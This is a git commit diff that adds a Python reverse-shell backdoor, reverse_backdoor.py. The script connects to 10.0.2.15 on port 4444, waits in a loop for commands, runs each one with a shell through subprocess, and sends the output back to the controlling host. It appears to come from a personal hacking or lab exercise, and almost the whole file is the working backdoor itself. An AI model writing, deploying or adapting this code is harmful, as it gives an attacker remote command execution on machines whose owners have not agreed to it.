a8f04b150fb68a820ffd87ea05c1b09df67c8e79
root <gvrosun@gmail.com>
2020-07-17 09:48:41 +0530

    listener.py v1.1.0

--- reverse_connection/reverse_backdoor.py
+++ reverse_connection/reverse_backdoor.py
@@ -1,4 +1,39 @@
 #!/usr/bin/env python
 
 import socket
+import subprocess
+import json
 
+
+class Backdoor:
+    def __init__(self, ip, port):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))
+
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def reliable_receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
+    def execute_commands(self, command):
+        return subprocess.check_output(command, shell=True)
+
+    def run(self):
+        while True:
+            command = self.reliable_receive()
+            command_result = self.execute_commands(command)
+            self.reliable_send(command_result)
+
+        connection.close()
+
+
+my_backdoor = Backdoor("10.0.2.15", 4444)
+my_backdoor.run()
